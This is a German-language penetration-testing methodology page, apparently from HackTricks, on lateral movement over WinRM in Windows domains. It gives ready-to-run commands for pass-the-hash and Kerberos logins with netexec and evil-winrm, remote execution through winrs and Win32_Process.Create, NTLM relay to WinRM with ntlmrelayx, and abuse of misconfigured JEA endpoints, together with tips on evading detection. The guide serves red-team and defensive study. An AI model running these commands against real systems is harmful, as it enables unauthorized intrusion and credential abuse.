# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM ist eines der praktischsten Transportmittel für **lateral movement** in Windows-Umgebungen, da es eine Remote-Shell über **WS-Man/HTTP(S)** bereitstellt, ohne dass Tricks zum Erstellen von SMB-Diensten nötig sind. Wenn das Ziel **5985/5986** offen hat und dein Principal Remoting verwenden darf, kannst du oft sehr schnell von „gültigen Zugangsdaten“ zu einer „interaktiven Shell“ gelangen.

Informationen zur **Protokoll-/Dienstaufzählung**, zu Listenern, zum Aktivieren von WinRM, zu `Invoke-Command` und zur allgemeinen Client-Nutzung findest du hier:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Warum Operatoren WinRM bevorzugen

- Verwendet **HTTP/HTTPS** statt SMB/RPC und funktioniert daher oft dort, wo die Ausführung im PsExec-Stil blockiert wird.
- Mit **Kerberos** werden keine wiederverwendbaren Zugangsdaten an das Ziel gesendet.
- Funktioniert zuverlässig mit Tools für **Windows**, **Linux** und **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Beim interaktiven PowerShell-Remoting wird auf dem Ziel **`wsmprovhost.exe`** im Kontext des authentifizierten Benutzers gestartet. Das unterscheidet sich operativ von der dienstbasierten Ausführung.

## Zugriffsmodell und Voraussetzungen

In der Praxis hängt erfolgreiches WinRM lateral movement von **drei** Dingen ab:

1. Das Ziel hat einen **WinRM-Listener** (`5985`/`5986`) und Firewall-Regeln, die den Zugriff erlauben.
2. Das Konto kann sich am Endpunkt **authentifizieren**.
3. Das Konto darf eine **Remoting-Sitzung öffnen**.

Häufige Möglichkeiten, diesen Zugriff zu erhalten:

- **Lokaler Administrator** auf dem Ziel.
- Mitgliedschaft in **Remote Management Users** auf neueren Systemen oder in **WinRMRemoteWMIUsers__** auf Systemen/Komponenten, die diese Gruppe noch berücksichtigen.
- Explizite Remoting-Berechtigungen, die über lokale Sicherheitsbeschreibungen / Änderungen an PowerShell-Remoting-ACLs delegiert wurden.

Wenn du bereits eine Box mit Admin-Rechten kontrollierst, beachte, dass du WinRM-Zugriff auch **ohne Mitgliedschaft in der vollständigen Admin-Gruppe delegieren** kannst. Verwende dazu die hier beschriebenen Techniken:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentifizierungsfallen, die bei lateral movement wichtig sind

- **Kerberos erfordert einen Hostnamen/FQDN**. Bei einer Verbindung über die IP-Adresse wechselt der Client normalerweise zu **NTLM/Negotiate**.
- In **Workgroup**- oder Cross-Trust-Sonderfällen erfordert NTLM häufig entweder **HTTPS** oder dass das Ziel auf dem Client zu **TrustedHosts** hinzugefügt wird.
- Bei **lokalen Konten** über Negotiate in einer Workgroup können UAC-Remoteeinschränkungen den Zugriff verhindern, sofern nicht das integrierte Administratorkonto verwendet oder `LocalAccountTokenFilterPolicy=1` gesetzt wird.
- PowerShell Remoting verwendet standardmäßig den **`HTTP/<host>`-SPN**. Wenn **`HTTP/<host>`** in der Umgebung bereits für ein anderes Dienstkonto registriert ist, kann WinRM Kerberos mit `0x80090322` fehlschlagen. Verwende dann einen SPN mit Portangabe oder wechsle zu **`WSMAN/<host>`**, sofern dieser SPN vorhanden ist.<sup>[[3]](#references)</sup>

Wenn du beim Password Spraying gültige Zugangsdaten erhältst, kannst du oft am schnellsten prüfen, ob sie zu einer Shell führen, indem du sie über WinRM validierst:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Lateral movement von Linux zu Windows

### NetExec / CrackMapExec für die Validierung und einmalige Ausführung

```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```

### Evil-WinRM für interaktive Shells

`evil-winrm` ist unter Linux weiterhin die bequemste Option für interaktive Sitzungen, da es **Passwörter**, **NT-Hashes**, **Kerberos-Tickets**, **Client-Zertifikate**, Dateiübertragungen und das Laden von PowerShell/.NET im Arbeitsspeicher unterstützt.

```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```

### Kerberos-SPN-Sonderfall: `HTTP` vs. `WSMAN`

Wenn der Standard-SPN **`HTTP/<host>`** zu Kerberos-Fehlern führt, versuche stattdessen, ein Ticket für **`WSMAN/<host>`** anzufordern bzw. zu verwenden. Das kommt offenbar in gehärteten oder ungewöhnlichen Unternehmensumgebungen vor, in denen **`HTTP/<host>`** bereits einem anderen Dienstkonto zugeordnet ist.<sup>[[3]](#references)</sup>

```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```

Dies ist auch nach dem Missbrauch von **RBCD / S4U** nützlich, wenn Sie gezielt ein **WSMAN**-Service-Ticket gefälscht oder angefordert haben, statt eines generischen `HTTP`-Tickets.

### Zertifikatbasierte Authentifizierung

WinRM unterstützt auch die **Authentifizierung mit Clientzertifikat**, doch das Zertifikat muss auf dem Ziel einem **lokalen Konto** zugeordnet sein. Aus offensiver Sicht ist das relevant, wenn:

- Sie ein gültiges Clientzertifikat samt privatem Schlüssel gestohlen/exportiert haben, das bereits für WinRM zugeordnet ist;
- Sie **AD CS / Pass-the-Certificate** missbraucht haben, um ein Zertifikat für einen Principal zu erhalten und dann zu einem anderen Authentifizierungspfad überzugehen;
- Sie in Umgebungen agieren, die bewusst auf Remoting mit passwortbasierter Authentifizierung verzichten.

```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```

Client-Zertifikat-WinRM ist viel seltener als die Authentifizierung mit Passwort/Hash/Kerberos. Wenn es jedoch verfügbar ist, kann es einen **passwortlosen Pfad für laterale Bewegung** bieten, der auch nach einer Passwortrotation bestehen bleibt.

### Python / Automatisierung mit `pypsrp`

Wenn du Automatisierung statt einer Operator-Shell benötigst, bietet `pypsrp` WinRM/PSRP aus Python mit Unterstützung für **NTLM**, **Zertifikatsauthentifizierung**, **Kerberos** und **CredSSP**.<sup>[[2]](#references)</sup>

```python
from pypsrp.client import Client

client = Client(
    "srv01.domain.local",
    username="DOMAIN\\user",
    password="Password123!",
    ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```


Wenn Sie eine genauere Kontrolle benötigen als mit dem High-Level-Wrapper `Client`, sind die Low-Level-APIs `WSMan` + `RunspacePool` bei zwei häufigen Operator-Problemen hilfreich:

- **`WSMAN`** als Kerberos-Dienst/SPN erzwingen, statt der standardmäßigen Erwartung **`HTTP`**, die viele PowerShell-Clients verwenden;
- eine Verbindung zu einem **nicht standardmäßigen PSRP-Endpunkt** herstellen, z. B. einer **JEA**- oder benutzerdefinierten Sitzungskonfiguration, anstatt `Microsoft.PowerShell`.

```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
    "srv01.domain.local",
    auth="kerberos",
    ssl=False,
    negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
    ps.add_script("whoami; Get-Command")
    output = ps.invoke()
    print(output)
```

### Benutzerdefinierte PSRP-Endpunkte und JEA sind bei lateraler Bewegung wichtig

Eine erfolgreiche WinRM-Authentifizierung bedeutet **nicht** immer, dass du beim standardmäßigen uneingeschränkten `Microsoft.PowerShell`-Endpunkt landest. In ausgereiften Umgebungen können **benutzerdefinierte Sitzungskonfigurationen** oder **JEA**-Endpunkte mit eigenen ACLs und eigenem Run-as-Verhalten verfügbar sein.<sup>[[1]](#references)</sup>

Wenn du bereits Codeausführung auf einem Windows-Host hast und herausfinden möchtest, welche Remoting-Schnittstellen vorhanden sind, liste die registrierten Endpunkte auf:

```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```

Wenn ein nützlicher Endpoint vorhanden ist, sprich ihn explizit an, statt die Standard-Shell zu verwenden:

```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```

Praktische Auswirkungen für offensive Aktivitäten:

- Ein **restricted** Endpoint kann für laterale Bewegung ausreichen, wenn er genau die richtigen Cmdlets/Funktionen für die Dienststeuerung, den Dateizugriff, die Prozesserstellung oder die Ausführung beliebiger .NET- bzw. externer Befehle bereitstellt.
- Eine **misconfigured JEA**-Rolle ist besonders wertvoll, wenn sie gefährliche Befehle wie `Start-Process`, weit gefasste Wildcards, beschreibbare Provider oder benutzerdefinierte Proxy-Funktionen bereitstellt, mit denen sich die vorgesehenen Einschränkungen umgehen lassen.
- Endpoints, die **RunAs virtual accounts** oder **gMSAs** verwenden, ändern den effektiven Sicherheitskontext der ausgeführten Befehle. Insbesondere kann ein Endpoint mit gMSA-Unterstützung beim zweiten Hop eine **Netzwerkidentität** bereitstellen, selbst wenn bei einer normalen WinRM-Sitzung das klassische Delegierungsproblem auftritt.

Prüfe bei einem benutzerdefinierten restricted Endpoint die effektiven Befehls- und Skriptberechtigungen getrennt voneinander: Eine kurze Liste von `Get-Command` beweist allein nicht, dass ein vorhandenes `.ps1` nicht ausgeführt werden kann. [JEA role capabilities](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) legen ausdrücklich fest, welche Skriptpfade aufgerufen werden können; andere benutzerdefinierte Endpoints können abweichende Sitzungsregeln anwenden. Wenn ein zulässiges Skript einen gespeicherten `SecureString` verwendet, um Anmeldedaten für einen anderen Host zu erstellen, nutzt ein Blob, der ohne expliziten Schlüssel erstellt wurde, [Windows DPAPI](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) und benötigt zur Entschlüsselung im Allgemeinen den Kontext des schützenden Benutzers und Computers. Prüfe die ACL des Skripts, zulässige Aufrufe, die Run-as-Identität und die Rechte für nachgelagerte Anmeldedaten, bevor du beschreibbaren Quellcode oder einen kopierten Blob als hostübergreifenden Eskalationspfad einstufst. Gib den geschützten Wert bei passiver Enumeration nicht aus.

Prüfe bei einer benutzerdefinierten JEA-Funktion, die einen Dateipfad akzeptiert, gemeinsam die registrierte Endpoint-ACL, die zugeordnete Role Capability und die effektive Run-as-Identität. Ein Aufrufer kann `NoLanguage` verwenden, während der Funktionscode im standardmäßigen Sprachmodus des Systems ausgeführt wird; ein virtuelles Konto kann außerdem lokale Administratorrechte besitzen. Wenn die Funktion ein zulässiges Verzeichnis anhand eines einfachen String-Präfixes prüft und anschließend den angegebenen Pfad liest, können `..`-Komponenten außerhalb dieses Verzeichnisses aufgelöst werden. Entscheidend ist der aufgelöste Pfad unter der Identität der Funktion, nicht der Sprachmodus des Aufrufers oder das scheinbare Präfix. Bestätige die erreichbare Funktion und ihre Validierung des endgültigen Pfads, bevor du eine lesbare `.psrc`- oder `.pssc`-Datei als Befund für privilegierten Dateizugriff wertest. Siehe Microsofts Hinweise zu [JEA role capability](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) und [security considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations).

## Laterale Bewegung mit nativem Windows-WinRM

### `winrs.exe`

`winrs.exe` ist integriert und nützlich, wenn du **native WinRM-Befehlsausführung** nutzen möchtest, ohne eine interaktive PowerShell-Remoting-Sitzung zu öffnen:

```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```

Zwei Flags werden leicht vergessen und sind in der Praxis wichtig:

- `/noprofile` ist oft erforderlich, wenn der Remote-Prinzipal **kein** lokaler Administrator ist.
- `/allowdelegate` ermöglicht es der Remote-Shell, deine Credentials für den Zugriff auf einen **dritten Host** zu verwenden (zum Beispiel, wenn der Befehl `\\fileserver\share` benötigt).

```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```

Operativ führt `winrs.exe` häufig zu einer ähnlichen Remote-Prozesskette wie:

```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```

Das ist wissenswert, da es sich von service-based exec und interaktiven PSRP-Sitzungen unterscheidet.

### `winrm.cmd` / WS-Man-COM statt PowerShell-Remoting

Du kannst Befehle auch über den **WinRM-Transport** ausführen, ohne `Enter-PSSession` zu verwenden, indem du WMI-Klassen über WS-Man aufrufst. Dabei bleibt WinRM der Transport, während **WMI `Win32_Process.Create`** als Primitive für die Remote-Ausführung dient:

```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```

Dieser Ansatz ist nützlich, wenn:

- Die PowerShell-Protokollierung intensiv überwacht wird.
- Du **WinRM transport** nutzen möchtest, aber keinen klassischen PS-Remoting-Workflow.
- Du eigene Tools rund um das **`WSMan.Automation`**-COM-Objekt entwickelst oder verwendest.

## NTLM relay zu WinRM (WS-Man)

Wenn SMB relay durch Signing blockiert und LDAP relay eingeschränkt ist, kann **WS-Man/WinRM** weiterhin ein attraktives relay-Ziel sein. Moderne Versionen von `ntlmrelayx.py` enthalten **WinRM relay servers** und können relay an **`wsman://`**- oder **`winrms://`**-Ziele durchführen.

```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```

Zwei praktische Hinweise:

- Relay ist am nützlichsten, wenn das Ziel **NTLM** akzeptiert und der weitergeleitete Principal WinRM verwenden darf.
- Aktueller Impacket-Code behandelt **`WSMANIDENTIFY: unauthenticated`**-Anfragen ausdrücklich, damit Probes im Stil von `Test-WSMan` den Relay-Ablauf nicht unterbrechen.

Informationen zu Einschränkungen bei mehreren Hops nach dem Aufbau einer ersten WinRM-Sitzung findest du hier:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC- und Erkennungshinweise

- **Interaktives PowerShell-Remoting** erstellt auf dem Ziel normalerweise **`wsmprovhost.exe`**.
- **`winrs.exe`** erstellt häufig **`winrshost.exe`** und danach den angeforderten Kindprozess.
- Benutzerdefinierte **JEA**-Endpunkte können Aktionen als virtuelle Konten **`WinRM_VA_*`** oder als konfiguriertes **gMSA** ausführen. Dadurch ändern sich sowohl die Telemetrie als auch das Verhalten beim zweiten Hop im Vergleich zu einer Shell im normalen Benutzerkontext.<sup>[[1]](#references)</sup>
- Rechne mit Telemetrie zu **Netzwerkanmeldungen**, WinRM-Dienstereignissen sowie PowerShell-Betriebs- und Skriptblockprotokollen, wenn du statt rohem `cmd.exe` PSRP verwendest.
- Wenn du nur einen einzelnen Befehl benötigst, sind `winrs.exe` oder eine einmalige WinRM-Ausführung möglicherweise unauffälliger als eine lang laufende interaktive Remoting-Sitzung.
- Wenn Kerberos verfügbar ist, bevorzuge **FQDN + Kerberos** gegenüber IP + NTLM, um sowohl Vertrauensprobleme als auch umständliche clientseitige Änderungen an `TrustedHosts` zu vermeiden.

## References

- [1] [Microsoft: Sicherheitsüberlegungen zu JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp-README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: Fehler `0x80090322` beim Verbinden von PowerShell mit einem Remoteserver über WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)
{{#include ../../banners/hacktricks-training.md}}
